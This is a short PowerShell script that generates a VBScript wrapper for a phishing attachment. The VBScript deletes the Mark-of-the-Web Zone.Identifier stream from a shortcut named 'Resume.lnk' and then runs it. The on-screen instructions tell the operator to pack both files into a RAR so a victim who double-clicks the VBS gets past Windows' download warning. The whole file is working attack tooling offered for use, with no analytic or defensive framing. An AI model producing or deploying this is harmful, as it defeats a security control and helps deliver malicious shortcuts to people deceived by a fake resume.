# CREATE VBS WRAPPER TO BYPASS MOTW WARNING

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  VBS MOTW BYPASS WRAPPER" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$lnkName = "Resume"
$lnkFile = "$lnkName.lnk"
$vbsFile = "$lnkName.vbs"

$vbsContent = @'
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

scriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
lnkPath = scriptPath & "\Resume.lnk"
zonePath = lnkPath & ":Zone.Identifier"

On Error Resume Next
Set objZone = objFSO.GetFile(zonePath)
If Not objZone Is Nothing Then
    objFSO.DeleteFile zonePath, True
End If
On Error Goto 0

objShell.Run Chr(34) & lnkPath & Chr(34), 1, False
'@

$vbsPath = Join-Path $PSScriptRoot $vbsFile

try {
    [System.IO.File]::WriteAllText($vbsPath, $vbsContent, [System.Text.Encoding]::ASCII)
    Write-Host "Created: $vbsFile" -ForegroundColor Green
    Write-Host ""
    Write-Host "SOLUTION:" -ForegroundColor Yellow
    Write-Host "  Include BOTH files in your RAR:" -ForegroundColor White
    Write-Host "    - $lnkFile" -ForegroundColor Green
    Write-Host "    - $vbsFile" -ForegroundColor Green
    Write-Host ""
    Write-Host "  User double-clicks $vbsFile" -ForegroundColor White
    Write-Host "  Removes MOTW then executes Resume.lnk" -ForegroundColor Cyan
    Write-Host ""
} catch {
    Write-Host "ERROR: $_" -ForegroundColor Red
    exit 1
}

Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
